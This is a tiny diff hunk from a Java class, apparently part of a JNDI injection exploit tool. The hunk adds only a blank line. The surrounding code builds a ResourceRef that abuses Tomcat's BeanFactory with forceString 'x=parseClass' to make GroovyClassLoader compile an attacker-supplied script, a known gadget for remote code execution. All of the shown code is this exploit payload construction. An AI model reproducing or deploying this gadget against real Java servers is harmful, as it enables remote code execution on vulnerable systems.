@@ -25,6 +25,7 @@ public class GroovyClassLoaderController extends BasicController {
         ResourceRef ref = new ResourceRef("groovy.lang.GroovyClassLoader", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
         ref.add(new StringRefAddr("forceString", "x=parseClass"));
         ref.add(new StringRefAddr("x", script));
+
         return ref;
     }
 }
